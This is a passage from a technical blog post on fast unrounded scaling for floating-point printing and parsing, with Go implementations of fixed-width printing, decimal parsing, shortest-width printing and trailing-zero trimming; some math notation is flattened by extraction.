~20ns precision,\ncompared to the x86’s sub-nanosecond precision.Here are the scatterplots and CDFs for 6-digit output on the two systems: The main idea of this post is to implementfast unrounded scaling,\nwhich computes an approximation tox·2e·10p,\noften in a single 64-bit multiplication.\nOn that foundation\nwe can build nearly trivial printing and parsing algorithms that run very fast.\nIn fact, the printing algorithms\nrun faster than all other known algorithms,\nincluding\nDragon4 [30],\nGrisu3 [23],\nErrol3 [4],\nRyū [2],\nRyū Printf [3],\nSchubfach [12],\nand Dragonbox [17],\nand the parsing algorithm runs faster than\nthe Eisel-Lemire algorithm [22].\nThis post presents both the algorithms and a concrete implementation in Go.\nI expect some form of this Go code to ship in Go 1.27 (scheduled for August 2026).This post is rather long—far longer than the implementations!—so here is a brief overview of the sections\nfor easier navigation and understanding where we’re headed.“Fixed-Point and Floating-Point Numbers”\nbriefly reviews fixed-point and floating-point numbers,\nestablishing some terminology and concepts needed for the rest of the post.“Unrounded Numbers” introduces the idea of unrounded numbers,\ninspired by the IEEE754 floating-point extended format.“Unrounded Scaling” defines the unrounded scaling primitive.“Fixed-Width Printing” formats floating-point numbers\nwith a given (fixed) number of decimal digits, at most 18.“Parsing Decimals” parses decimal numbers of\nat most 19 digits into floating-point numbers.“Shortest-Width Printing” formats floating-point numbers\nusing the shortest representation that parses back to the original number.“Fast Unrounded Scaling” reveals the\nshort but subtle implementation of fast unrounded scaling\nthat enables those simple algorithms.“Sketch of a Proof of Fast Scaling” briefly sketches the proof\nthat the fast unrounded scaling algorithm is correct.\nA companion post, “Fast Unrounded Scaling: Proof by Ivy”\nprovides the full details.“Omit Needless Multiplications” uses a key idea from the proof\nto optimize the fast unrounded scaling implementation further,\nreducing it to a single 64-bit multiplication in many cases.“Performance” compares the performance of the\nimplementation of these algorithms against earlier ones.“History and Related Work” examines the history of\nsolutions to the floating-point printing and parsing problems\nand traces the origins of the specific ideas used in this\npost’s algorithms.For the last decade, there has been a new algorithm for floating-point printing and parsing\nevery few years.\nGiven the simplicity and speed of the algorithms in this post\nand the increasingly small deltas between successive algorithms,\nperhaps we are nearing an optimal solution.Fixed-Point and Floating-Point NumbersFixed-point numbers have the formf=m·Befor an integer mantissam, constant baseB, and constant (fixed) exponente.\nWe can create fixed-point representations\nin any base, but the most common are base 2 (for computers)\nand base 10 (for people).\nThis diagram shows fixed-point numbers at various scales\nthat can represent numbers between 0 and 1:Using a smaller scaling factor increases precision\nat the cost of larger mantissas.\nWhen representing very large numbers, we can use\nlarger scaling factors to reduce the mantissa size.\nFor example, here are various representations of\nnumbers around one billion:Floating-point numbers are the same as base-2 fixed-point numbers except thatechanges with\nthe overall size of the number.\nSmall numbers use very small scaling factors\nwhile large numbers use large scaling factors,\naiming to keep the mantissas a constant length.\nFor float64s, the exponenteis chosen so that the mantissamhas 53 bits,\nmeaningm∈[252,253).\nFor example, for numbers in[½,1), float64s usee=−53;\nfor numbers in[1,2)they usee=−52;\nand so on.[The notation[a,b)is ahalf-open interval, which includesabut notb.\nIn contrast, theclosed interval[a,b]includes bothaandb.\nWe writex∈[a,b)orx∈[a,b]to say thatxis in that interval.\nUsing this notation,m∈[252,253)means252≤m<253.]In addition to limiting the mantissa size, we must also limit the exponent,\nto keep the overall number a fixed size.\nFor float64s, assumingm∈[252,253), the exponente∈[−1074,971].A float64 consists of 1 sign bit, 11 exponent bits, and 52 mantissa bits.\nThenormal11-bit exponent encodings0x001through0x3fedenotee=−1074throughe=971.\nFor those, the mantissam∈[252,253),\nand it is encoded into only 52 bits by omitting the leading 1 bit.\nThe special exponent encoding0x3ffis used for infinity and not-a-number.\nThat leaves the encoding0x000, which is also special.\nIt denotese=−1074(like0x001does)\nbut with mantissasm∈[0,252)without an implicit leading 1.\nThesesubnormalsordenormalized numbers[8]\ncontinue the fixed-point2−1074scale down to zero,\nwhich ends up encoded (not coincidentally) as 64 zero bits.Other definitions of floating point numbers use different interpretations.\nFor example the IEEE754 standard usesm∈[1,2)withe∈[−1023,1023],\nwhile the C standard libaryfrexpfunction usesm∈[½,1)withe∈[−1022,1024].\nBoth of these choices makemitself a fixed-point number instead of an integer.\nOur integer definition lets us use integer math.\nThese interpretations are all equivalent and differ only by a constant added toe.This description of float64s applies to float32s as well, but with different constants. This table summarizes the two encodings:float32float64sign bits11encoded mantissa bits2352encoded exponent bits811exponent range form∈[1,2)[−127,127][−1023,1023]exponent range for integerm[−150,104][−1074,971]normal numbers[223,224)·2[−150,104][252,253)·2[−1074,971]subnormal numbers[0,223)·2−150[0,252)·2−1074exponent range for 64-bitm[−190,64][−1085,960]normal numbers[263,264)·2[−190,64][263,264)·2[−1085,960]subnormal numbers[0,263)·2−190[0,263)·2−1085To convert a float64 to its bits, we use Go’smath.Float64bits.// unpack64 returns m, e such that f = m * 2**e.// The caller is expected to have handled 0, NaN, and ±Inf already.// To unpack a float32 f, use unpack64(float64(f)).func unpack64(f float64) (uint64, int) {\n\tconst shift = 64 - 53\n\tconst minExp = -(1074 + shift)\n\tb := math.Float64bits(f)\n\tm := 1<<63 | (b&(1<<52-1))<<shift\n\te := int((b >> 52) & (1<<shift - 1))\n\tif e == 0 {\n\t\tm &^= 1 << 63\n\t\te = minExp\n\t\ts := 64 - bits.Len64(m)\n\t\treturn m << s, e - s\n\t}\n\treturn m, (e - 1) + minExp\n}fpfmt/fpfmt.go:23,39To convert back, we use Go’smath.Float64frombits.// pack64 takes m, e and returns f = m * 2**e.// It assumes the caller has provided a 53-bit mantissa m// and an exponent that is in range for the mantissa.func pack64(m uint64, e int) float64 {\n\tif m&(1<<52) == 0 {\n\t\treturn math.Float64frombits(m)\n\t}\n\treturn math.Float64frombits(m&^(1<<52) | uint64(1075+e)<<52)\n}fpfmt/fpfmt.go:41,49[Other presentations use “fraction” and “significand” instead of “mantissa”.\nThis post uses mantissa for consistency with my 2011 post\nand because I generally agree with Agatha Mallett’s excellent\n“In Defense of ‘Mantissa’”.]Unrounded NumbersFloating-point operations are defined as if computed exactly to infinite precision\nand then rounded to the nearest actual floating-point number,\nbreaking ties by rounding to an even mantissa.\nOf course, real implementations don’t use infinite precision;\nthey only keep enough precision to round properly.\nWe will use the same idea.\nIn our algorithms, we want the scaling operation to eventually evaluate to an integer,\nbut we want to give the caller control over the rounding step.\nSo instead of returning an integer, we will return anunrounded number,\nwhich contains all the information needed to round it in a variety of ways.The unrounded form of any real numberx, which we will write as as⟨x⟩,\nis the truncated integer part ofxfollowed by two more bits.\nThose bits indicate (1) whether the fractional part ofxwas at least ½, and (2) whether the fractional part was not exactly 0 or ½.\nIf you think ofxas a real number written in binary, the first extra bit is the bit immediately after the “binary point”—the bit that represents2−1, aka the ½ bit—and the second extra bit is the OR of all the bits after the ½ bit.This definition applies even to numbers that require an infinite binary representation.\nFor example, just as 1/3 requires an infinite decimal representation ‘0.333...’,\n1.6 requires an infinite binary representation ‘1.1001100110011...’.\nThe unrounded version⟨1.6⟩is finite: ‘1.11’.\nBut instead of reading unrounded numbers in binary,\nlet’s print⟨x⟩as‘n.hs’wherenis the integer part⟨x⟩>>2,his 0 or 5, andsis ‘+’ when the second bit is 1.\nThen⟨1.6⟩is written ‘1.5+’.⟨x⟩=⌊4x⌋|(4x≠⌊4x⌋)⟨6exactly⟩=24=‘6.0’⟨6.000001⟩=25=‘6.0+’⟨6.499999⟩=25=‘6.0+’⟨6.5exactly⟩=26=‘6.5’⟨6.500001⟩=27=‘6.5+’⟨6.999999⟩=27=‘6.5+’⟨7exactly⟩=28=‘7.0’Let’s implement unrounded numbers in Go.type unrounded uint64\n\nfunc unround(x float64) unrounded {\n\treturn unrounded(math.Floor(4*x)) | bool2[unrounded](math.Floor(4*x) != 4*x)\n}\n\nfunc (u unrounded) String() string {\n\treturn fmt.Sprintf(\"⟨%d.%d%s⟩\", u>>2, 5*((u>>1)&1), \"+\"[1-u&1:])\n}fpfmt/fpfmt.go:52,61Thebool2function converts a boolean to an integer.\n(The Go compiler will implement this using an inlined conditional move.)// bool2 converts b to an integer: 1 for true, 0 for false.func bool2[T ~int | ~uint64](b bool) T {\n\tif b {\n\t\treturn 1\n\t}\n\treturn 0\n}fpfmt/fpfmt.go:15,21We won’t use theunroundconstructor in our actual code, but it’s helpful for playing.\nFor example, we can try the examples we just saw:row(\"x\", \"raw\", \"str\")\nfor _, x := range []float64{6, 6.001, 6.499, 6.5, 6.501, 6.999, 7} {\n    u := unround(x)\n    row(x, uint64(u), u)\n}\ntable()x      raw  str\n6      24   ⟨6.0⟩\n6.001  25   ⟨6.0+⟩\n6.499  25   ⟨6.0+⟩\n6.5    26   ⟨6.5⟩\n6.501  27   ⟨6.5+⟩\n6.999  27   ⟨6.5+⟩\n7      28   ⟨7.0⟩The unrounded form⟨x⟩holds the information needed by all the usual rounding operations.\nAdding 0, 1, 2, or 3 and then dividing by four (or shifting right by two) yields: floor, round with ½ rounding down, round with ½ rounding up, and ceiling.\nIn floating-point math, we want to round with ½ rounding to even, meaning 1½ and 2½ both round to 2.\nWe can do that by adding1+odd(x),\nwhereodd(x)is 0 or 1 according to whetherxis odd.\nThat’s just the low bit ofx:odd(x)=(x&1)=(⟨x⟩>>2)&1.Putting that all together:⌊⟨x⟩⌋=(⟨x⟩+0)>>2(floor)[⟨x⟩]−=(⟨x⟩+1)>>2(round,halfdown)[⟨x⟩]even=(⟨x⟩+1+odd(x))>>2(round,halftoeven)=(⟨x⟩+1+((⟨x⟩>>2)&1))>>2[⟨x⟩]+=(⟨x⟩+2)>>2(round,halfup)⌈⟨x⟩⌉=(⟨x⟩+3)>>2(ceiling)In Go:func (u unrounded) floor() uint64         { return uint64((u + 0) >> 2) }\nfunc (u unrounded) roundHalfDown() uint64 { return uint64((u + 1) >> 2) }\nfunc (u unrounded) round() uint64         { return uint64((u + 1 + (u>>2)&1) >> 2) }\nfunc (u unrounded) roundHalfUp() uint64   { return uint64((u + 2) >> 2) }\nfunc (u unrounded) ceil() uint64          { return uint64((u + 3) >> 2) }fpfmt/fpfmt.go:62,66row(\"x\", \"floor\", \"round½↓\", \"round\", \"round½↑\", \"ceil\")\nfor _, x := range []float64{6, 6.25, 6.5, 6.75, 7, 7.5, 8.5} {\n    u := unround(x)\n    row(u, u.floor(), u.roundHalfDown(), u.round(), u.roundHalfUp(), u.ceil())\n}\ntable()x       floor  round½↓  round  round½↑  ceil\n⟨6.0⟩   6      6        6      6        6\n⟨6.0+⟩  6      6        6      6        7\n⟨6.5⟩   6      6        6      7        7\n⟨6.5+⟩  6      7        7      7        7\n⟨7.0⟩   7      7        7      7        7\n⟨7.5⟩   7      7        8      8        8\n⟨8.5⟩   8      8        8      9        9Dividing unrounded numbers preserves correct rounding as long as the second extra bit\nis maintained correctly: once it is set to 1, it has to stay a 1 in all future results.\nThis gives the second extra bit its shorter name: thesticky bit.To divide an unrounded number, we do a normal divide but force the sticky bit to 1\nwhen there is a remainder.\nRight shift does the same.⟨x/n⟩=(⟨x⟩/n)|(⟨x⟩modn≠0)|(⟨x⟩&1)⟨x>>n⟩=(⟨x⟩>>n)|(⟨x⟩mod2n≠0)|(⟨x⟩&1)For example, if we rounded 15.4 to an integer 15 and then divided it by 6,\nwe’d get 2.5, which rounds down to 2,\nbut the more precise answer would be 15.4/6 = 2.57, which rounds up to 3.\nAn unrounded division handles this correctly:⟨15.4⟩=61‘15.0+’“alittlemorethan15”⟨15.4/6⟩=11‘2.5+’“alittlemorethan2½”[⟨15.4/6⟩]=3Let’s implement division and right shift in Go:func (u unrounded) div(d uint64) unrounded {\n\tx := uint64(u)\n\treturn unrounded(x/d) | u&1 | bool2[unrounded](x%d != 0)\n}\n\nfunc (u unrounded) rsh(s int) unrounded {\n\treturn u>>s | u&1 | bool2[unrounded](u&((1<<s)-1) != 0)\n}fpfmt/fpfmt.go:69,76u := unround(15.1).div(6)\nfmt.Println(u, u.round())⟨2.5+⟩ 3Finally, we are going to need to be able to nudge an unrounded number\nup or down before computing a ceiling or floor,\nas if we added or subtracting a tiny amount.\nLet’s add that:func (u unrounded) nudge(δ int) unrounded { return u + unrounded(δ) }fpfmt/fpfmt.go:67row(\"x\", \"nudge(-1).floor\", \"floor\", \"ceil\", \"nudge(+1).ceil\")\nfor _, x := range []float64{15, 15.1, 15.9, 16} {\n    u := unround(x)\n    row(u, u.nudge(-1).floor(), u.floor(), u.ceil(), u.nudge(+1).ceil())\n}x        nudge(-1).floor  floor  ceil  nudge(+1).ceil\n⟨15.0⟩   14               15     15    16\n⟨15.0+⟩  15               15     16    16\n⟨15.5+⟩  15               15     16    16\n⟨16.0⟩   15               16     16    17Floating-point hardware maintains three extra bits to round\nall arithmetic operations correctly.\nFor just division and right shift, we can get by with only two bits.Unrounded ScalingThe fundamental insight of this post is that all\nfloating-point conversions can be written correctly\nand simply usingunrounded scaling,\nwhich multiplies a numberxby a power of two and a power of ten\nand returns the unrounded product.uscale(x,e,p)=⟨x·2e·10p⟩.Whenpis negative, the value10pcannot be stored exactly in any finite binary floating-point number,\nso any implementation of uscale must be careful.In Go, we can implement uscale using big integers and an unrounded division:func uscale(x uint64, e, p int) unrounded {\n    num :=   mul(big(4), big(x), pow(2, max(0, p)),  pow(10, max(0, e)))\n    denom := mul(                pow(2, max(0, -p)), pow(10, max(0, -e)))\n    div, mod := divmod(num, denom)\n    return unrounded(div.uint64() | bool2[uint64](!mod.isZero()))\n}Themaxexpressions choose between multiplying2eintonumwhene>0or multiplying2−eintodenomwhene<0,\nand similarly for10p.\nThedivmodimplements the floor, andmod.isZeroreports\nwhether the floor was exact.This implementation of uscale is correct but inefficient.\nIn our usage,eandpwill mostly cancel out,\ntypically with opposite signs,\nand the inputxand resultuscale(x,e,p),\nwill always fit in 64 bits.\nThat limited input domain and range makes it possible\nto implement a very fast, completely accurate uscale,\nand we’ll see that implementation later.Our actual implementation will be split into two functions,\nto allow sharing some computations derived frompande.\nInstead ofuscale(x, e, p), the fast Go version will be called asuscale(x, prescale(e, p, log2Pow10(p))).\nAlso, callers are responsible for passing in anxleft-shifted to have its\nhigh bit set.\nTheunpackfunction we looked at already arranged that for its result,\nbut otherwise callers need to do something like:shift = 64 - bits.Len64(x)\n... uscale(x<<shift, prescale(e-shift, p, log2Pow10(p))) ...Conceptually, uscale maps numbers on one fixed-point scale to numbers on another,\nincluding converting between binary and decimal scales.\nFor example, consider the scales2−13and10−4:Givenxfrom the2−13side,uscale(x,−13,4)maps to the equivalent\npoint on the10−4side;\nand givenxfrom the10−4,uscale(x,13,−4)maps to the equivalent\npoint on the2−13side.\nBefore we look at the fast implementation ofuscale,\nlet’s look at how it simplifies all the floating-point printing\nand parsing algorithms.Fixed-Width PrintingOur first application of uscale is fixed-width printing.\nGivenf=m·2e, we want to compute its\napproximate equivalentd·10de, wheredhas exactlyndigits.\nIt only takes 17 digits to uniquely identify any float64,\nso we’re willing to limitn≤18,\nwhich will ensuredfits in a uint64.\nThe strategy is to multiplyfby10pfor somepand then round it to an integerd.\nThen the result isd·10−p.Then-digit requirement meansd=m·2e·10p∈[10n−1,10n).\nFrom this we can derivep:m·2e·10p∈[10n−1,10n)m·2e·10p∈10n−1·[1,10)[factoringrange](log10m·2e)+p∈n−1+[0,1)[takinglog]p∈n−1−(log10m·2e)+[0,1)[isolatingp]p∈n−1−((log10m·2e)−[0,1))[regrouping]p=n−1−⌊log10m·2e⌋[pisaninteger]p=n−1−⌊(log102)·(e+log2m)⌋[changinglogbase]It is okay forpto be too big—we will get an extra digit that we can divide away—so\nwe can approximatelog2masbits(m)−1, wherebits(m)is the bit length ofm.\nThat gives usp=n−1−⌊(log102)·(e+bits(m)−1)⌋.\nWith this derivation ofp, uscale does the rest of the work.The floor expression is a simple linear function and can be computed\nexactly for our inputs using fixed-point arithmetic:// log10Pow2(x) returns ⌊log₁₀ 2**x⌋ = ⌊x * log₁₀ 2⌋.func log10Pow2(x int) int {// log₁₀ 2 ≈ 0.30102999566 ≈ 78913 / 2^18return (x * 78913) >> 18\n}fpfmt/fpfmt.go:78,82Thelog2Pow10function, which we mentioned above and need to\nuse when callingprescale, is similar:// log2Pow10(x) returns ⌊log₂ 10**x⌋ = ⌊x * log₂ 10⌋.func log2Pow10(x int) int {// log₂ 10 ≈ 3.32192809489 ≈ 108853 / 2^15return (x * 108853) >> 15\n}fpfmt/fpfmt.go:84,88Now we can put everything together:// FixedWidth returns the n-digit decimal form of f as d * 10**p.// n can be at most 18.func FixedWidth(f float64, n int) (d uint64, p int) {\n\tif n > 18 {\n\t\tpanic(\"too many digits\")\n\t}\n\tm, e := unpack64(f)\n\tp = n - 1 - log10Pow2(e+63)\n\tu := uscale(m, prescale(e, p, log2Pow10(p)))\n\td = u.round()\n\tif d >= uint64pow10[n] {\n\t\td, p = u.div(10).round(), p-1\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:96,110That’s the entire conversion!The code splitsfintom,e;\ncomputespas just described;\nand then usesuscaleandroundto computed=f·10p.\nIf the result has an extra digit,\neither because our approximate log madeptoo big,\nor because of rollover during rounding,\nwe divide the unrounded form by 10, round again, and updatep.\nWhen we approximatedlog2mby counting bits,\nwe used the exact log of the greatest power of two less than or equal tom,\nso the computeddmust be less than twice the intended limit10n,\nmeaning the leading digit (if there are too many digits) must be 1.\nAnd rollover only happens for ‘999...’,\nso it is not possible to have both an extra digit and rollover.As an example conversion,\nconsider a float64 approximation ofπ(0x1921fb54442d18·2−51) to 15 decimal digits.\nWe havee=−51,n=15, andbits(m)=53,\nsop=n−1−⌊(log102)·(e+bits(m)−1)⌋=14.The2−51and10−14scales align like this:Thenuscale(0x1921fb54442d18,−51,14)returns the unrounded number ‘314159265358979.0+’,\nwhich rounds to 314159265358979.\nOur answer is then314159265358979·10−14.Parsing DecimalsUnrounded scaling also lets us parse decimal representations of floating-point numbers efficiently.\nLet’s assume we’ve taken care of parsing a string like ‘1.23e45’\nand now have an integer and exponent liked=123,p=45−2=43.\nTo convertd·10pto a float64,\nwe can choose an appropriateeso thatd·2e·10p∈[252,253)and then return[uscale(d,e,p)]·2−e.The derivation ofeis similar to the derivation ofpfor printing:d·2e·10p∈[252,253)d·2e·10p∈252·[1,2)[factoringrange](log2d·10p)+e∈52+[0,1)[takinglog]e∈52−(log2d·10p)+[0,1)[isolatinge]e∈52−((log2d·10p)−[0,1))[regrouping]e=52−⌊log2d·10p⌋[pisaninteger]e=52−⌊(log2d)+(log210)·p⌋[changinglogbase]Once again, it is okay to overestimatee, so we can approximatelog2d=bits(d)−1, yieldinge=53−bits(d)−⌊(log210)·p⌋.\nIfeis very large,−ewill be very small,\nmeaning we will be creating a subnormal,\nso we need to round to a smaller number of bits.\nTo handle this, we capeat 1074,\nwhich caps−eat−1074.\nAs before, due to the approximation oflog2d, the scaled result is at most twice as large as our target,\nmeaning it might have one extra bit to shift away.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\te := min(1074, 53-b-log2Pow10(p))\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, log2Pow10(p)))\n\tm := u.round()\n\tif m >= 1<<53 {\n\t\tm, e = u.rsh(1).round(), e-1\n\t}\n\treturn pack64(m, -e)\n}fpfmt/unopt/fpfmt.go:111,125FixedWidthandParsedemonstrate\nexactly how similar printing and parsing really are.\nIn printing, we are givenm,eand\nfindp; thenuscale(m,e,p)converts binary to decimal.\nIn parsing, we are givend,pand finde;\nthenuscale(d,e,p)converts decimal to binary.We can make parsing a little faster with a few hand optimizations.\nThis optimized version introduceslpto avoid callinglog2Pow10twice,\nand it implements the extra digit handling in branch-free code.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\tlp := log2Pow10(p)\n\te := min(1074, 53-b-lp)\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, lp))// This block is branch-free code for://\tif u.round() >= 1<<53 {//\t\tu = u.rsh(1)//\t\te = e - 1//\t}s := bool2[int](u >= unmin(1<<53))\n\tu = (u >> s) | u&1\n\te = e - s\n\n\treturn pack64(u.round(), -e)\n}// unmin returns the minimum unrounded that rounds to x.func unmin(x uint64) unrounded {\n\treturn unrounded(x<<2 - 2)\n}fpfmt/fpfmt.go:112,138Now we are ready for our next challenge: shortest-width printing.Shortest-Width PrintingShortest-width printing means to prepare a decimal representation\nthat a floating-point parser would convert back to the exact samefloat64,\nusing as few digits as possible.\nWhen there are multiple possible shortest decimal outputs,\nwe insist on the one that is nearest the original input,\nnamely the correctly-rounded one.\nIn general, 17 digits are always enough to uniquely identify afloat64,\nbut sometimes fewer can be used, even down to a single digit in numbers like 1, 2e10, and 3e−42.An obvious approach would be to useFixedPrintfor increasing values ofn,\nstopping whenParse(FixedPrint(f, n)) == f.\nOr maybe we should derive an equation fornand then useFixedPrint(f, n)directly.\nSurprisingly, neither approach works:Short(f)is not necessarilyFixedPrint(f, n)for somen.\nThe simplest demonstration of this isf=289=618970019642690137449562112=0x10000000000000·237,\nwhich looks like this:Becausefis a power of two, the floating-point exponent\nchanges atf,\nas does the spacing between floating-point numbers.\nThe next smallest value is0x1ffffffffffff·2−38,\nmarked on the diagram as0xffffffffffff½·2−37.\nThe dotted lines mark the halfway points betweenfand its nearest floating point neighbors.\nThe accurate decimal answers are those at or between the dotted lines,\nall of which convert back tof.The correct rounding offto 16 digits ends in …901: the next digit infis 3,\nso we should round down.\nHowever, because of the spacing change aroundf,\nthat correct decimal rounding does not convert back tof.\nAFixedPrintloop would choose a 17-digit form instead.\nBut there is an accurate 16-digit form, namely …902.\nThat decimal is closer tofthan it is to any other float64,\nmaking it an accurated.\nAnd since the closer 16-digit value …901 is not an accurated,Shortshould use …902 instead.Assuming as usual thatf=m·2e,\nlet’s definefootprint(f)to be the distance between the midpoints fromfto its\nfloating-point neighbors.\nNormally those neighbors are2ein either direction—the midpoints are(m±½)·2e—sofootprint(f)=2e.\nAt a power of two with an exponent change,\nthe lower midpoint is instead(m−¼)·2e,\nsofootprint(f)=¾·2e.\nThe rounding paradox can only happen for powers of two\nwith this kind of skewed footprint.All that is to say we cannot useFixedWidthwith “the rightn”.\nBut we can use scale directly with “the rightp.”\nSpecifically, we can compute the midpoints betweenfand its floating-point neighbors\nand scale them to obtain the\nminimum and maximum valid choices ford.\nThen we can make the best choice:If one of the validdends in 0, use it after removing trailing zeros.(Choosing the rightpwill allow at most ten consecutive integers,\nso at most will one end in 0.)If there is only one validd, use it.Otherwise there are at least two validd, at least one on each side off;\nuse the correctly rounded one.Here is an example of the first case: one of the validdends in zero.We already saw an example of the second case: only one validd.\nFor numbers with symmetric footprints, that will be the\ncorrectly roundedd.\nAs we saw for numbers with skewed footprints,\nthat may not be the correctly roundedd,\nbut it is still the correct answer.Finally, here is an example of the third case: multiple validd,\nbut none that end in zero.\nNow we should use the correctly rounded one.This sounds great, but how do we determine the rightp?\nWe wantfootprint(f)to allow at least one decimal integer,\nbut at most ten, meaning1≤footprint(f)<10.\nLuckily, we can hit that target exactly.For a symmetric footprint:footprint(f)·10p∈[1,10)2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/2e)·[1,10)[isolatingp]p∈−(log102)·e+[0,1)[takinglog]p∈−((log102)·e−[0,1))[regrouping]p=−⌊(log102)·e⌋[pisaninteger]For a skewed footprint:footprint(f)·10p∈[1,10)¾·2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/(¾·2e))·[1,10)[isolatingp]p∈−(log10¾+(log102)·e)+[0,1)[takinglog]p∈−(log10¾+(log102)·e−[0,1))[regrouping]p=−⌊log10¾+(log102)·e⌋[pisaninteger]For the symmetric footprint, we can uselog10Pow2,\nbut for the skewed footprint, we need a new approximation:// skewed computes the skewed footprint of m * 2**e,// which is ⌊log₁₀ 3/4 * 2**e⌋ = ⌊e*(log₁₀ 2)-(log₁₀ 4/3)⌋.func skewed(e int) int {\n\treturn (e*631305 - 261663) >> 21\n}fpfmt/fpfmt.go:234,238We should worry about a footprint with decimal width exactly 1,\nsince iffhad an odd mantissa,\nthe midpoints would be excluded.\nIn that case, if the decimals were the exact midpoints,\nthere would be no decimal between them,\nmaking the conversion invalid.\nBut it turns out we should not worry too much.\nFor a skewed footprint,¾·2e·10pcan never be exactly 1,\nbecause nothing can divide away the 3.\nFor a symmetric footprint,2e·10p=1can only happen fore=p=0,\nbut then scaling is a no-op,\nso that the decimal integers are exactly the binary integers.\nThe non-integer midpoints map to non-integer decimals.When we compute the decimal equivalents of the midpoints,\nwe will use ceiling and floor instead of rounding them,\nto make sure the integer results are valid decimal answers.\nIf the mantissamis odd, we will nudge the unrounded forms\ninward slightly before taking the ceiling or floor,\nsince rounding will be away fromm.The Go code is:// Short computes the shortest formatting of f,// using as few digits as possible that will still round trip// back to the original float64.func Short(f float64) (d uint64, p int) {\n\tconst minExp = -1085\n\n\tm, e := unpack64(f)\n\n\tvar min uint64\n\tz := 11// extra zero bits at bottom of m; 11 for 53-bit mif m == 1<<63 && e > minExp {\n\t\tp = -skewed(e + z)\n\t\tmin = m - 1<<(z-2)// min = m - 1/4 * 2**(e+z)} else {\n\t\tif e < minExp {\n\t\t\tz = 11 + (minExp - e)\n\t\t}\n\t\tp = -log10Pow2(e + z)\n\t\tmin = m - 1<<(z-1)// min = m - 1/2 * 2**(e+z)}\n\tmax := m + 1<<(z-1)// max = m + 1/2 * 2**(e+z)odd := int(m>>z) & 1\n\n\tpre := prescale(e, p, log2Pow10(p))\n\tdmin := uscale(min, pre).nudge(+odd).ceil()\n\tdmax := uscale(max, pre).nudge(-odd).floor()\n\n\tif d = dmax / 10; d*10 >= dmin {\n\t\treturn trimZeros(d, -(p - 1))\n\t}\n\tif d = dmin; d < dmax {\n\t\td = uscale(m, pre).round()\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:198,232Notice that this algorithm requires either two or three calls touscale.\nWhen the number being printed has only one valid representation\nof the shortest length, we avoid the third call touscale.\nAlso notice that theprescaleresult is shared by all three calls.Whenm=263,min<263,\nmeaning it won’t be left shifted as far as possible\nduring the call touscale.\nAlthough we could detect this case and calluscalewith2·minande−1,\nusingminunmodified is fine:\nit is still shifted enough that the bitsuscaleneeds to return will stay in the high 64 bits of the 192-bit product,\nand using the sameelets us use the sameprescalework for all three calls.Trimming ZerosThetrimZerosfunction used inShortremoves any trailing zeros from its argument,\nupdating the decimal power. An unoptimized version is:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tif x%10 != 0 {\n\t\treturn x, p\n\t}\n\tx /= 10\n\tp += 1\n\n\tif x%100000000 == 0 {\n\t\tx /= 100000000\n\t\tp += 8\n\t}\n\tif x%10000 == 0 {\n\t\tx /= 10000\n\t\tp += 4\n\t}\n\tif x%100 == 0 {\n\t\tx /= 100\n\t\tp += 2\n\t}\n\tif x%10 == 0 {\n\t\tx /= 10\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/unopt/fpfmt.go:227,254The initial removal of a single zero gives an early return for\nthe common case of having no zeros.\nOtherwise, the code makes four additional checks that\ncollectively remove up to 16 more zeros.\nFor outputs with many zeros, these four checks run faster\nthan a loop removing one zero at a time.When compiling this code,\nthe Go compiler reduces the remainder checks to multiplications\nusing the following well-known optimization.\nAn exactuint64divisionx/cwherexmodc=0can be implemented byx·mwheremis theuint64multiplicative inverse ofc, meaningm·cmod264=1:\nSincecis also the multiplicative inverse ofm,x·mis\nlossless—all the exact multiples ofcmap to all of[0,(264−1)/c]—so\nthe non-multiples are forced to map to larger values.\nThis observation gives a quick test for whetherxis an exact multiple ofc:\ncheck whetherx·m≤(264−1)/c.Only oddchave multiplicative inverses modulo powers of two,\nso even divisors require more work.\nTo compute an exact divisionx/(c<<s),\nwe can use(x/c)>>sinstead.\nTo check for remainder, we need to check that those lowsbits are all zero before we shift them away.\nWe can merge that check with the range check by rotating those bits\ninto the high part instead of discarding them:\ncheck whetherx·m↻>s≤(264−1)/c,\nwhere↻>is right rotate.The Go compiler does this transformation automatically\nfor theifconditions intrimZeros,\nbut inside theifbodies, it does not reuse the\nexact quotient it just computed.\nI considered changing the compiler to recognize that pattern,\nbut instead I wrote out the remainder check by hand\nin the optimized version, allowing me to reuse the computed exact quotients:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tconst (\n\t\tmaxUint64 = ^uint64(0)\n\t\tinv5p8    = 0xc767074b22e90e21// inverse of 5**8inv5p4    = 0xd288ce703afb7e91// inverse of 5**4inv5p2    = 0x8f5c28f5c28f5c29// inverse of 5**2inv5      = 0xcccccccccccccccd// inverse of 5)// Cut 1 zero, or else return.if d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t} else {\n\t\treturn x, p\n\t}// Cut 8 zeros, then 4, then 2, then 1.if d := bits.RotateLeft64(x*inv5p8, -8); d <= maxUint64/100000000 {\n\t\tx = d\n\t\tp += 8\n\t}\n\tif d := bits.RotateLeft64(x*inv5p4, -4); d <= maxUint64/10000 {\n\t\tx = d\n\t\tp += 4\n\t}\n\tif d := bits.RotateLeft64(x*inv5p2, -2); d <= maxUint64/100 {\n\t\tx = d\n\t\tp += 2\n\t}\n\tif d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/fpfmt.go:240,278This approach to trimming zeros is from 